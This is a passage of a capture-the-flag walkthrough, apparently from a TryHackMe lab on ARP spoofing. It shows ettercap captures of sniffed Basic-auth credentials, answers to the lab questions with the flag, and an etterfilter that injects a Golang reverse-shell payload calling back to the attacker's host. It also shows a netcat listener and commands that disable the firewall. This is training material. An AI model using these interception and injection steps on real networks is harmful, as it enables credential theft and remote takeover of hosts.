+Mon Feb  6 17:19:37 2023 [860909]
+TCP  192.168.12.20:80 --> 192.168.12.10:47634 | A (0)
+
+Mon Feb  6 17:19:38 2023 [301644]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (7)
+whoami
+
+Mon Feb  6 17:19:38 2023 [341588]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:19:38 2023 [703133]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:19:38 2023 [718295]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | SA (0)
+
+Mon Feb  6 17:19:38 2023 [730222]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:38 2023 [756177]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | AP (7)
+whoami
+
+Mon Feb  6 17:19:38 2023 [786531]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:38 2023 [788139]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:19:38 2023 [814660]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | A (0)
+
+Mon Feb  6 17:19:42 2023 [763194]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | AP (4)
+pwd
+
+Mon Feb  6 17:19:42 2023 [778414]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:42 2023 [778628]
+TCP  192.168.12.20:44150 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:19:42 2023 [794494]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44150 | A (0)
+Closing text interface...
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+Unified sniffing was stopped.
+
+root@eve:/tmp# cat /etc/hosts
+127.0.0.1 	localhost
+192.168.12.10 	alice
+192.168.12.20 	bob
+192.168.12.66	eve
+```
+
+## Exploitation
+```text
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+
+YWRtaW46czNjcjN0X1A0eno=
+admin:s3cr3t_P4zz
+
+Basic YWRtaW46czNjcjN0X3A0eno=not authenticatedadmin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
+<title>Directory listing for /</title>
+<body>
+<h2>Directory listing for /</h2>
+<hr>
+<ul>
+<li><a href="SimpleHTTPAuthServer.py">SimpleHTTPAuthServer.py</a>
+<li><a href="test.txt">test.txt</a>
+<li><a href="user.txt">user.txt</a>
+</ul>
+<hr>
+</body>
+</html>
+admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/test.txt
+OK
+
+Re-ARPing the victims means sending new ARP messages to update the ARP caches of the hosts in the network to remove the ARP poison that was previously added. This is typically done to restore normal network operation after an ARP spoofing attack has been performed.
+
+curl -u user:pass http://ip/
+
+admin@eve:~$ curl -u admin:s3cr3t_P4zz http://192.168.12.20/user.txt
+THM{wh0s_$n!ff1ng_0ur_cr3ds}
+
+whoami, pwd,ls
+```
+Scan the network on eth1. Who's there? Enter their IP addresses in ascending order.
+*192.168.12.10, 192.168.12.20*
+Which machine has an open well-known port?
+*192.168.12.20*
+What is the port number?
+*80*
+Can you access the content behind the service from your current position? (Nay/Yay)
+*Nay*
+Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay)
+tcpdump -vvA -i eth1
+*Nay*
+Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay)
+ettercap -T -i eth1 -M arp
+*Yay*
+Who is using that service?
+hostname
+*alice*
+What's the hostname the requests are sent to?
+*www.server.bob*
+Which file is being requested?
+*test.txt*
+What text is in the file?
+Just two letters
+*OK*
+Which credentials are being used for authentication? (username:password)
+the basic auth authorization "key" is just a base64 encoded credential pair
+*admin:s3cr3t_P4zz*
+Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?
+The second-last line displayed after pressing q (without the "...")
+*RE-ARPing the victims*
+Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay)
+*Yay*
+What is the user.txt flag?
+You should also have seen some  rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?
+The type of connection you want to catch when compromising hosts allowing you to execute commands by calling back to your listener.
+*reverse shell*
+What commands are being executed? Answer in the order they are being executed.
+*whoami, pwd,ls*
+Which of the listed files do you want?
+Which of the listed files most likely contains the flag? (Just the file name.)
+*root.txt*
+### Man-in-the-Middle: Manipulation
+As a pentester, your first approach would be to try to hack Bob's web server. For the purpose of this room, let's assume it's impossible. Also, capturing basic auth credentials won't help for password reuse or similar attacks.
+So, let's advance our ongoing ARP poisoning attack into a fully-fledged MITM that includes packet manipulation! As Alice's packets pass through your attacker machine (**eve**), we can tamper with them.
+How can we go about doing this? Ettercap comes with an `-F` option that allows you to apply filters in the form of specified **etterfilter.ef** files for the session. These **.ef** files, however, have to be compiled from **etterfilter** source filter files (**.ecf**) first. Their source code syntax is similar to C code. To keep this task more beginner-friendly, we assume it won't matter if Alice detects our manipulation activities. For the sake of this room, we are only going to manipulate her commands and won't be taking any OPSEC precautions.
+Which brave command of hers should volunteer for our audacious endeavor? How about… yes, whoami, of course!
+Before you copy and paste the filter below, it's best to understand the **etterfilter** command and its source file syntax. Consult the man page by either running  `man etterfilter` or browsing the [linux.die.net/man/8/etterfilter](https://linux.die.net/man/8/etterfilter) page.
+Now, create a new etterfilter code file named **whoami.ecf** and try to write a filter matching Alice's source port and transport protocol as well as replacing **whoami** data with a reverse shell payload of your choice. To see the solution, click the dropdown arrow:
+_Show possible solution (spoiler!)_
+In the end, your filter might look similar to this one, where **<reverse_shell>** contains the reverse shell payload you chose:
+`if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {       log(DATA.data, "/root/ettercap.log");       replace("whoami", "<reverse_shell>" );       msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");   }`
+**Note:** Quotation marks need to be **[escaped](https://linux.die.net/abs-guide/escapingsection.html)**. So, in case you want your filter to **replace** e.g. `whoami` with `echo -e "whoami\nroot"`, then the quotation marks around `whoami\nroot` would have to be escaped like this: `replace("whoami", "echo -e \"whoami\nroot\" " )`
+To see a solution for the reverse shell payload, click the dropdown arrow:
+_Show possible solution (spoiler!)_
+The following is an example reverse shell in Golang with quotation marks already escaped:
+`echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &`
+Finally, we need to compile the**.ecf** into an **.ef** file:
+`etterfilter whoami.ecf -o whoami.ef`
+Don't forget to start your listener (backgrounded). For the upper example above, you could use:
+`nc -nvlp 6666 &`
+Not so fast! If anything, we still need to allow the incoming connection through the firewall. Disable **ufw** or create a corresponding **allow** rule; otherwise, Bob's reverse shell will be blocked by the firewall:
+`ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp` or completely disable the firewall by running `ufw disable`
+Now, run **ettercap** specifying your newly created **etterfilter** file:
+`ettercap -T -i eth1 -M arp -F whoami.ef`
+A few seconds after executing this command, you should see the _"###### ETTERFILTER: …"_ message and/or _"Connection received on 192.168.12.20 …"_  in your Netcat output, which means you've just caught a reverse shell from Bob! Now, you can quit **ettercap** (with **q**), foreground your Netcat listener (with **fg**), and enjoy your shell!
+**Note:** To restrict ettercap's ARP poisoning efforts to your actual targets and only display traffic between them, you can specify them as target groups 1 and 2 by using "///"-token annotation after the **-M arp** option:
+`ettercap -T -i eth1 -M arp /192.168.12.10// /192.168.12.20// -F whoami.ef`
+**Hint:** In case the reverse shell won't work, try replacing **whoami** with a suitable **cat** command to get the flag.
+Answer the questions below
+```text
+┌──(kali㉿kali)-[~/learning_l2_mac]
+└─$ cat whoami.ecf 
+if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/root/ettercap.log");
+    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );
+    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
+}
+
+Este es un script de ettercap filter que modifica un paquete TCP si se cumple la condición especificada. La condición es que si el protocolo es TCP y el puerto origen es 4444 y el contenido del paquete contiene la cadena "whoami", se registrará el contenido del paquete en un archivo llamado "/root/ettercap.log". Luego, se reemplazará la cadena "whoami" con un comando que escribirá un programa en Go en el archivo "/tmp/t.go" y luego ejecutará ese programa en segundo plano. El programa en Go establecerá una conexión de shell inverso a la dirección IP "192.168.12.66" en el puerto 6666.
+
+The above command is used to compile an etterfilter script file (with ".ecf" extension) into a binary etterfilter file (with ".ef" extension) that can be used by the Ettercap program. The "-o" option is used to specify the output file name. In this case, the compiled etterfilter file will be named "whoami.ef".
+
+admin@eve:~$ nano whoami.ecf
+admin@eve:~$ etterfilter whoami.ecf -o whoami.ef
+
+etterfilter 0.8.3 copyright 2001-2019 Ettercap Development Team
+
+ 14 protocol tables loaded:
+	DECODED DATA udp tcp esp gre icmp ipv6 ip arp wifi fddi tr eth 
+
+ 13 constants loaded:
+	VRRP OSPF GRE UDP TCP ESP ICMP6 ICMP PPTP PPPOE IP6 IP ARP 
+
+ Parsing source file 'whoami.ecf'  done.
+
+ Unfolding the meta-tree  done.
+
+ Converting labels to real offsets  done.
+
+ Writing output to 'whoami.ef'  done.
+
+ -> Script encoded into 9 instructions.
+
+admin@eve:~$ ls
+whoami.ecf  whoami.ef
+
+sudo ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp
+
+or
+
+sudo ufw disable
+
+admin@eve:~$ sudo ufw disable
+[sudo] password for admin: 
+Firewall stopped and disabled on system startup
+```
+```text
+┌──(kali㉿kali)-[~/learning_l2_mac]
+└─$ ssh admin@10.10.148.6  
+admin@10.10.148.6's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 06 Feb 2023 05:45:33 PM UTC
+
+  System load:  0.06               Users logged in:          1
+  Usage of /:   68.9% of 16.85GB   IPv4 address for docker0: 172.17.0.1
+  Memory usage: 46%                IPv4 address for eth0:    10.10.148.6
+  Swap usage:   0%                 IPv4 address for eth1:    192.168.12.66
+  Processes:    154                IPv4 address for virbr0:  192.168.122.1
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+25 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+         __/\\\______________/\\\_________________/\\\\\\___________________________________________________________________        
+          _\/\\\_____________\/\\\________________\////\\\___________________________________________________________________       
+           _\/\\\_____________\/\\\___________________\/\\\___________________________________________________________________      
+            _\//\\\____/\\\____/\\\______/\\\\\\\\_____\/\\\________/\\\\\\\\_____/\\\\\_______/\\\\\__/\\\\\_______/\\\\\\\\__     
+             __\//\\\__/\\\\\__/\\\_____/\\\/////\\\____\/\\\______/\\\//////____/\\\///\\\___/\\\///\\\\\///\\\___/\\\/////\\\_    
+              ___\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\_____\/\\\_____/\\\__________/\\\__\//\\\_\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\__   
+               ____\//\\\\\\//\\\\\_____\//\\///////______\/\\\____\//\\\________\//\\\__/\\\__\/\\\__\/\\\__\/\\\_\//\\///////___  
+                _____\//\\\__\//\\\_______\//\\\\\\\\\\__/\\\\\\\\\__\///\\\\\\\\__\///\\\\\/___\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\_ 
+                 ______\///____\///_________\//////////__\/////////_____\////////_____\/////_____\///___\///___\///____\//////////__
+                    ________________________________________________________________/\\\________________________        
+                     _______________________________________________________________\/\\\________________________       
+                      _____/\\\____________________________________________/\\\______\/\\\________________________      
+                       __/\\\\\\\\\\\_____/\\\\\_________________________/\\\\\\\\\\\_\/\\\_____________/\\\\\\\\__     
+                        _\////\\\////____/\\\///\\\______________________\////\\\////__\/\\\\\\\\\\____/\\\/////\\\_    
+                         ____\/\\\_______/\\\__\//\\\________________________\/\\\______\/\\\/////\\\__/\\\\\\\\\\\__   
+                          ____\/\\\_/\\__\//\\\__/\\\_________________________\/\\\_/\\__\/\\\___\/\\\_\//\\///////___  
+                           ____\//\\\\\____\///\\\\\/__________________________\//\\\\\___\/\\\___\/\\\__\//\\\\\\\\\\_ 
+                            _____\/////_______\/////_____________________________\/////____\///____\///____\//////////__
+               __/\\\\\\\\\\\\________________________________________________________________________________________        
+                _\/\\\////////\\\______________________________________________________________________________________       
+                 _\/\\\______\//\\\_______________________________/\\\\\\\\_____________________________________________      
+                  _\/\\\_______\/\\\__/\\\____/\\\__/\\/\\\\\\____/\\\////\\\_____/\\\\\\\\______/\\\\\_____/\\/\\\\\\___     
+                   _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\////\\\__\//\\\\\\\\\___/\\\/////\\\___/\\\///\\\__\/\\\////\\\__    
+                    _\/\\\_______\/\\\_\/\\\___\/\\\_\/\\\__\//\\\__\///////\\\__/\\\\\\\\\\\___/\\\__\//\\\_\/\\\__\//\\\_   
+                     _\/\\\_______/\\\__\/\\\___\/\\\_\/\\\___\/\\\__/\\_____\\\_\//\\///////___\//\\\__/\\\__\/\\\___\/\\\_  
+                      _\/\\\\\\\\\\\\/___\//\\\\\\\\\__\/\\\___\/\\\_\//\\\\\\\\___\//\\\\\\\\\\__\///\\\\\/___\/\\\___\/\\\_ 
+                       _\////////////______\/////////___\///____\///___\////////_____\//////////_____\/////_____\///____\///__
+             ______________________/\\\\\___________________________/\\\\\__________/\\\\\\\\\\\____/\\\\\\\\\\\_______        
+              ____________________/\\\///__________________________/\\\///\\\______/\\\/////////\\\_\/////\\\///________       
+               ___________________/\\\____________________________/\\\/__\///\\\___\//\\\______\///______\/\\\___________      
+                _____/\\\\\_____/\\\\\\\\\________________________/\\\______\//\\\___\////\\\_____________\/\\\___________     
+                 ___/\\\///\\\__\////\\\//________________________\/\\\_______\/\\\______\////\\\__________\/\\\______/\\\_    
+                  __/\\\__\//\\\____\/\\\__________________________\//\\\______/\\\__________\////\\\_______\/\\\_____\///__   
+                   _\//\\\__/\\\_____\/\\\___________________________\///\\\__/\\\_____/\\\______\//\\\______\/\\\___________  
+                    __\///\\\\\/______\/\\\_____________________________\///\\\\\/_____\///\\\\\\\\\\\/____/\\\\\\\\\\\__/\\\_ 
+                     ____\/////________\///________________________________\/////_________\///////////_____\///////////__\///__
+       __/\\\_________________/\\\\\\\\\_____/\\\________/\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\__________________/\\\\\\\\\_____        
+        _\/\\\_______________/\\\\\\\\\\\\\__\///\\\____/\\\/__\/\\\///////////___/\\\///////\\\______________/\\\///////\\\___       
+         _\/\\\______________/\\\/////////\\\___\///\\\/\\\/____\/\\\_____________\/\\\_____\/\\\_____________\///______\//\\\__      
+          _\/\\\_____________\/\\\_______\/\\\_____\///\\\/______\/\\\\\\\\\\\_____\/\\\\\\\\\\\/________________________/\\\/___     
+           _\/\\\_____________\/\\\\\\\\\\\\\\\_______\/\\\_______\/\\\///////______\/\\\//////\\\_____________________/\\\//_____    
+            _\/\\\_____________\/\\\/////////\\\_______\/\\\_______\/\\\_____________\/\\\____\//\\\_________________/\\\//________   
+             _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_____________\/\\\_____\//\\\______________/\\\/___________  
+              _\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_______\/\\\_______\/\\\\\\\\\\\\\\\_\/\\\______\//\\\____________/\\\\\\\\\\\\\\\_ 
+               _\///////////////__\///________\///________\///________\///////////////__\///________\///____________\///////////////__
+____/\\\__/\\\______________________________________________________________________________________________________________________        
+ ___\/\\\_\/\\\______________________________________________________________________________________________________________________       
+  __/\\\\\\\\\\\\\____________________/\\\__________/\\\__________________________________________________________________/\\\\\\\\\__      
+   _\///\\\///\\\/______/\\\\\\\\___/\\\\\\\\\\\__/\\\\\\\\\\\_____/\\\\\\\\___/\\/\\\\\\\______/\\\\\\\\__/\\\\\\\\\_____/\\\/////\\\_     
+    ___\/\\\_\/\\\_____/\\\/////\\\_\////\\\////__\////\\\////____/\\\/////\\\_\/\\\/////\\\___/\\\//////__\////////\\\___\/\\\\\\\\\\__    
+     __/\\\\\\\\\\\\\__/\\\\\\\\\\\_____\/\\\_________\/\\\_______/\\\\\\\\\\\__\/\\\___\///___/\\\___________/\\\\\\\\\\__\/\\\//////___   
+      _\///\\\///\\\/__\//\\///////______\/\\\_/\\_____\/\\\_/\\__\//\\///////___\/\\\_________\//\\\_________/\\\/////\\\__\/\\\_________  
+       ___\/\\\_\/\\\____\//\\\\\\\\\\____\//\\\\\______\//\\\\\____\//\\\\\\\\\\_\/\\\__________\///\\\\\\\\_\//\\\\\\\\/\\_\/\\\_________ 
+        ___\///__\///______\//////////______\/////________\/////______\//////////__\///_____________\////////___\////////\//__\///__________
+
+admin@eve:~$ nc -nvlp 6666 &
+[1] 8738
+admin@eve:~$ Listening on 0.0.0.0 6666
+
+admin@eve:~$ sudo ettercap -T -i eth1 -M arp -F whoami.ef
+
+ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team
+
+Content filters loaded from whoami.ef...
+Listening on:
+  eth1 -> 0E:D9:C1:ED:A6:C1
+	  192.168.12.66/255.255.255.0
+	  fe80::8862:1aff:fee7:9471/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+24609 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+Mon Feb  6 17:46:29 2023 [333492]
+  192.168.12.10:0 --> 192.168.12.20:0 |  (0)
+
+Mon Feb  6 17:46:29 2023 [333605]
+  192.168.12.20:0 --> 192.168.12.10:0 |  (0)
+
+Mon Feb  6 17:46:30 2023 [726743]
+TCP  192.168.12.10:48196 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:46:30 2023 [733144]
+TCP  192.168.12.20:80 --> 192.168.12.10:48196 | SA (0)
+
+Mon Feb  6 17:46:30 2023 [740944]
+TCP  192.168.12.10:48196 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:46:30 2023 [741346]
+TCP  192.168.12.10:48196 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:46:30 2023 [749156]
+TCP  192.168.12.20:80 --> 192.168.12.10:48196 | A (0)
+
+Mon Feb  6 17:46:30 2023 [751154]
+TCP  192.168.12.20:80 --> 192.168.12.10:48196 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:46:30 2023 [751371]
+TCP  192.168.12.20:80 --> 192.168.12.10:48196 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:46:30 2023 [757024]
+TCP  192.168.12.10:48196 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:46:30 2023 [758175]
+TCP  192.168.12.10:48196 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:46:30 2023 [765102]
+TCP  192.168.12.20:80 --> 192.168.12.10:48196 | A (0)
+
+Mon Feb  6 17:46:31 2023 [998807]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44704 | AP (3)
+ls
+
+Mon Feb  6 17:46:32 2023 [5022]
+TCP  192.168.12.20:44704 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:46:33 2023 [9519]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
+ls
+
+Mon Feb  6 17:46:33 2023 [13024]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:33 2023 [14363]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:46:33 2023 [21056]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | A (0)
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:46:37 2023 [10737]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
+whoami
+
+Mon Feb  6 17:46:37 2023 [56936]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:37 2023 [834276]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:37 2023 [834316]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | SA (0)
+
+Mon Feb  6 17:46:37 2023 [834413]
+TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:46:38 2023 [350567]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:46:38 2023 [357058]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | SA (0)
+
+Mon Feb  6 17:46:38 2023 [365035]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:38 2023 [375345]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
+whoami
+filter engine: Cannot open file /root/ettercap.log
+###### ETTERFILTER: substituted 'whoami' with reverse shell. ######
+
+Mon Feb  6 17:46:38 2023 [381122]
+TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:38 2023 [966813]
+TCP  192.168.12.20:34768 --> 192.168.12.66:6666 | S (0)
+
+Mon Feb  6 17:46:38 2023 [966852]
+TCP  192.168.12.66:6666 --> 192.168.12.20:34768 | SA (0)
+
+Mon Feb  6 17:46:38 2023 [966951]
+TCP  192.168.12.20:34768 --> 192.168.12.66:6666 | A (0)
+
+Mon Feb  6 17:46:41 2023 [11790]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
+pwd
+
+Mon Feb  6 17:46:41 2023 [13044]
+TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:46:42 2023 [377326]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
